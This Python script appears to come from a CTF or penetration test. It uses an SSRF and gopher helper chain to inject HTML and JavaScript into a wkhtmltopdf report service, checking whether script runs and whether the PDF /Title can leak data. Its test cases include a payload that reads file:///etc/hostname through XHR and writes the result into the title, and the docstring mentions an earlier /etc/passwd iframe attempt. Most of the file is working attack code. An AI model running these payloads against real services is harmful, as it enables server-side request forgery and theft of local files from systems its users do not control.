#!/usr/bin/env python3
"""Is JavaScript live in the renderer, and is /Title a clean plaintext channel?

The /etc/passwd iframe PDF contained zero text operators: Qt fetched the file but never
drew it (plain text in a subframe has no plugin). /Title, on the other hand, comes out
of the PDF as UTF-16BE plaintext, so it is the cheapest leak if script can write it.

  A) title=<literal>      proves the app forwards `title` to wkhtmltopdf --title
  B) <script>document.title="JSWORKS123"  proves script runs at all
"""
import base64
import html as H
import json
import re
import sys
import time
import urllib.parse

import gopher
import ssrf


def w(s):
    sys.stdout.buffer.write((str(s) + "\n").encode("utf-8", "replace"))
    sys.stdout.flush()


def render(content, title=None):
    body = "content=" + content
    if title is not None:
        body += "&title=" + title
    feed = gopher.gopher_raw("POST", "/report", body,
                             ["Content-Type: application/x-www-form-urlencoded"])
    st, pg = ssrf.get("/", feed=feed, timeout=70)
    m = re.search(r'<pre class="tape">(.*?)</pre>', pg, re.S)
    raw = H.unescape(urllib.parse.unquote(m.group(1))) if m else ""
    rest = raw.partition("\r\n\r\n")[2]
    try:
        obj = json.loads(rest)
    except Exception:
        return {"_err": rest[:160]}
    pdf = base64.b64decode(obj["data"]) if obj.get("data") else b""
    titles = []
    for t in re.findall(rb"/Title \((.*?)\)", pdf, re.S):
        if t[:2] == b"\xfe\xff":
            titles.append(t.decode("utf-16-be", "replace"))
        else:
            titles.append(t.decode("latin-1", "replace"))
    return {"keys": sorted(obj), "pdf": len(pdf), "title": titles, "err": obj.get("error")}


CASES = [
    ("A title literal", "<h1>x</h1>", "TTTTEST42"),
    ("B script title", '<script>document.title="JSWORKS123";</script>', None),
    ("C script body", '<script>document.body.textContent="BODYTEXT927";</script>', None),
    ("D xhr title", '<script>var x=new XMLHttpRequest();x.open("GET","file:///etc/hostname",'
                    'false);x.send();document.title="HN"+x.responseText;</script>', None),
]

if __name__ == "__main__":
    for label, content, title in CASES:
        r = render(content, title)
        w("%-18s %s" % (label, r))
        time.sleep(1.0)
